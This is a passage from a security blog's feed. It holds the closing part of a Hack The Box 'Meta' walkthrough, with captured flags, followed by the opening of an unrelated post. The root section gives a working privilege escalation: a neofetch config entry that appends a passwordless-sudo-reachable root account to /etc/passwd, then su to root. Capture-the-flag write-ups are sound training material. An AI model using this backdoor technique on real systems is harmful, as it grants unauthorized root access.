+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh thomas@10.129.159.86 -i id_rsa&lt;/span&gt;
+&lt;span class="code-line"&gt;thomas@meta:~$ cat user.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;34bdbba1436e176c3c13ceb0a045d740&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="root"&gt;Root&lt;/h1&gt;
+&lt;p&gt;As usual we run our enumeration script and process and found out that our user
+can run &lt;code&gt;/usr/bin/neofetch \"\"&lt;/code&gt; as root without password. Also the
+&lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt; environment variable is preserved.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;thomas@meta:~$ sudo -l&lt;/span&gt;
+&lt;span class="code-line"&gt;Matching Defaults entries for thomas on meta:&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,&lt;/span&gt;
+&lt;span class="code-line"&gt;    env_keep+=XDG_CONFIG_HOME&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;User thomas may run the following commands on meta:&lt;/span&gt;
+&lt;span class="code-line"&gt;    (root) NOPASSWD: /usr/bin/neofetch \&amp;quot;\&amp;quot;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We modify the &lt;code&gt;neofetch&lt;/code&gt; configuration file and the &lt;code&gt;image_source&lt;/code&gt; parameter to
+execute a command. The result of this command will be use as the &lt;code&gt;neofetch&lt;/code&gt;
+logo. We just create a new user with a know password (see
+&lt;a href="https://maggick.fr/2021/07/htb-armageddon.html"&gt;Armageddon article&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;image_source="$(echo 'toto:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' &amp;gt;&amp;gt; /etc/passwd)"&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We export the configuration file, copy our local version of it (as it was
+regularly rewritten) and run the &lt;code&gt;sudo&lt;/code&gt; command.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;export XDG_CONFIG_HOME="/home/thomas/.config" &amp;amp;&amp;amp; cp config.conf .config/neofetch/config.conf &amp;amp;&amp;amp; sudo /usr/bin/neofetch \"\"&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Then we can switch user as &lt;code&gt;toto&lt;/code&gt; and get a &lt;code&gt;root&lt;/code&gt; shell allowing to grab the
+root flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;thomas@meta:~$ su toto&lt;/span&gt;
+&lt;span class="code-line"&gt;Password:&lt;/span&gt;
+&lt;span class="code-line"&gt;root@meta:/home/thomas# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
+&lt;span class="code-line"&gt;root@meta:/home/thomas# cd&lt;/span&gt;
+&lt;span class="code-line"&gt;root@meta:~# cat root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;40e95295043f27cd9f2c6e21561dbb6d&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;A lot of enumeration and very specific vulnerability to exploit for this box.
+I really do not like subdomain enumeration on HTB :/ also, the &lt;code&gt;ImageMagick&lt;/code&gt;
+exploit is not 100% reliable and I had to kill the box and initiate a new one
+(resetting the box was not enough)&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="subdomain"></category><category term="exiftool"></category><category term="ImageMagick"></category><category term="neofetch"></category></entry><entry><title>Forgot username?</title><link href="https://maggick.fr/2022/06/forgot-username.html" rel="alternate"></link><published>2022-06-11T09:25:00+02:00</published><updated>2022-06-11T09:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-11:/2022/06/forgot-username.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forgot username" class="align-left" src="/media/2022.06/forgot.jpg" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;While browsing on the Internet,
 I founded a strange functionality &lt;code&gt;forgot username?&lt;/code&gt;. Everyone know about the &lt;code&gt;forgot password&lt;/code&gt; one that
 often imply to input the user email address and get a link to reset ones password. So what is that
